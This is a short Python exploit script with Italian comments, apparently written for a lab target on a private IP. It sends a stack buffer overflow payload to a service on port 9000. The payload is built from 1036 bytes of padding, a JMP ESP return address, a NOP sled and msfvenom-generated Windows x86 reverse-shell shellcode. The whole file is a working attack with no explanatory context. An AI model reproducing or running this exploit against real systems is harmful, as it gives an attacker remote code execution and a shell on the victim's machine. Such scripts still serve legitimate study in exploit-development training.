
import socket

ip = "192.168.195.132"
port = 9000


#struttura buffer    padding + ret + nop + shellcode

buf =  b""

buf += b"\x41"*1036     #padding

buf += b"\x62\xb4\x13\x77" #return address (JMP ESP)

buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" #nop sled

buf += b"\xb8\xb4\xf5\x86\x42\xd9\xc1\xd9\x74\x24\xf4\x5e\x33" #reverse shell windows x86 (msfvenom)
buf += b"\xc9\xb1\x52\x83\xc6\x04\x31\x46\x0e\x03\xf2\xfb\x64"
buf += b"\xb7\x06\xeb\xeb\x38\xf6\xec\x8b\xb1\x13\xdd\x8b\xa6"
buf += b"\x50\x4e\x3c\xac\x34\x63\xb7\xe0\xac\xf0\xb5\x2c\xc3"
buf += b"\xb1\x70\x0b\xea\x42\x28\x6f\x6d\xc1\x33\xbc\x4d\xf8"
buf += b"\xfb\xb1\x8c\x3d\xe1\x38\xdc\x96\x6d\xee\xf0\x93\x38"
buf += b"\x33\x7b\xef\xad\x33\x98\xb8\xcc\x12\x0f\xb2\x96\xb4"
buf += b"\xae\x17\xa3\xfc\xa8\x74\x8e\xb7\x43\x4e\x64\x46\x85"
buf += b"\x9e\x85\xe5\xe8\x2e\x74\xf7\x2d\x88\x67\x82\x47\xea"
buf += b"\x1a\x95\x9c\x90\xc0\x10\x06\x32\x82\x83\xe2\xc2\x47"
buf += b"\x55\x61\xc8\x2c\x11\x2d\xcd\xb3\xf6\x46\xe9\x38\xf9"
buf += b"\x88\x7b\x7a\xde\x0c\x27\xd8\x7f\x15\x8d\x8f\x80\x45"
buf += b"\x6e\x6f\x25\x0e\x83\x64\x54\x4d\xcc\x49\x55\x6d\x0c"
buf += b"\xc6\xee\x1e\x3e\x49\x45\x88\x72\x02\x43\x4f\x74\x39"
buf += b"\x33\xdf\x8b\xc2\x44\xf6\x4f\x96\x14\x60\x79\x97\xfe"
buf += b"\x70\x86\x42\x50\x20\x28\x3d\x11\x90\x88\xed\xf9\xfa"
buf += b"\x06\xd1\x1a\x05\xcd\x7a\xb0\xfc\x86\x44\xed\x3d\xd7"
buf += b"\x2d\xec\xc1\xfb\x85\x79\x27\x91\xc5\x2f\xf0\x0e\x7f"
buf += b"\x6a\x8a\xaf\x80\xa0\xf7\xf0\x0b\x47\x08\xbe\xfb\x22"
buf += b"\x1a\x57\x0c\x79\x40\xfe\x13\x57\xec\x9c\x86\x3c\xec"
buf += b"\xeb\xba\xea\xbb\xbc\x0d\xe3\x29\x51\x37\x5d\x4f\xa8"
buf += b"\xa1\xa6\xcb\x77\x12\x28\xd2\xfa\x2e\x0e\xc4\xc2\xaf"
buf += b"\x0a\xb0\x9a\xf9\xc4\x6e\x5d\x50\xa7\xd8\x37\x0f\x61"
buf += b"\x8c\xce\x63\xb2\xca\xce\xa9\x44\x32\x7e\x04\x11\x4d"
buf += b"\x4f\xc0\x95\x36\xad\x70\x59\xed\x75\x80\x10\xaf\xdc"
buf += b"\x09\xfd\x3a\x5d\x54\xfe\x91\xa2\x61\x7d\x13\x5b\x96"
buf += b"\x9d\x56\x5e\xd2\x19\x8b\x12\x4b\xcc\xab\x81\x6c\xc5"

 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Invio buffer in corso...")
  #print(buf)
  s.send(buf)
  
  print("Ok!")
except:
  print("Impossibile collegarsi.")
